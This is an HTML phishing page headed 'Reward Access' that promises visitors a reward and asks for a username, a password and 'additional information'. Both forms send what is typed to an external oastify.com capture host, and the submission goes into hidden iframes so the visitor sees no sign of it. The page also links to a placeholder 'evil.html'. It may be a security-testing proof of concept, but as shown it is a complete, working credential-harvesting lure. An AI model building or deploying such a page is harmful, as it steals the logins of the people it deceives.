<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reward Access</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }

        header {
            padding: 20px;
            background-color: #333;
            color: white;
        }

        img {
            width: 100%;
            max-width: 600px;
            height: auto;
        }

        .form-container {
            display: flex;
            justify-content: space-around;
            margin-top: 20px;
        }

        .form {
            width: 45%;
        }

        .iframe {
            display: none;
        }
    </style>
</head>
<body>
    <header>
        <h1>You are in the right place!</h1>
        <p>Please follow the instructions below to access and get the reward.</p>
    </header>

    <p>Go to: <a href="https://example.com/evil.html" target="_blank">https://example.com/evil.html</a></p>

    <div class="form-container">
        <!-- First Form -->
        <div class="form">
            <form id="visibleForm1" action="https://4ejgjx9x2xeovey2wwxnr877vy1wpndc.oastify.com/submit" method="post">
                <label for="username1">Username:</label>
                <input type="text" id="username1" name="username1" required><br>

                <label for="password1">Password:</label>
                <input type="password" id="password1" name="password1" required><br>

                <input type="button" value="Submit" onclick="submitForm('visibleForm1', 'hiddenForm1')">
            </form>

            <iframe class="iframe" id="hiddenForm1" name="hiddenForm1" src="about:blank"></iframe>
        </div>

        <!-- Second Form -->
        <div class="form">
            <form id="visibleForm2" action="https://4ejgjx9x2xeovey2wwxnr877vy1wpndc.oastify.com/submit" method="post">
                <label for="additionalInfo">Additional Information:</label>
                <input type="text" id="additionalInfo" name="additionalInfo" required><br>

                <input type="button" value="Submit" onclick="submitForm('visibleForm2', 'hiddenForm2')">
            </form>

            <iframe class="iframe" id="hiddenForm2" name="hiddenForm2" src="about:blank"></iframe>
        </div>
    </div>

    <img src="https://example.com/your-image.jpg" alt="Reward Image">

    <script>
        function submitForm(visibleFormId, hiddenFormId) {
            var visibleForm = document.getElementById(visibleFormId);
            var hiddenForm = document.getElementById(hiddenFormId);

            // Copy form values to hidden form
            hiddenForm.contentDocument.body.innerHTML = visibleForm.outerHTML;

            // Set the target of the visible form to the hidden iframe
            visibleForm.target = hiddenFormId;

            // Submit the visible form
            visibleForm.submit();
        }
    </script>
</body>
</html>
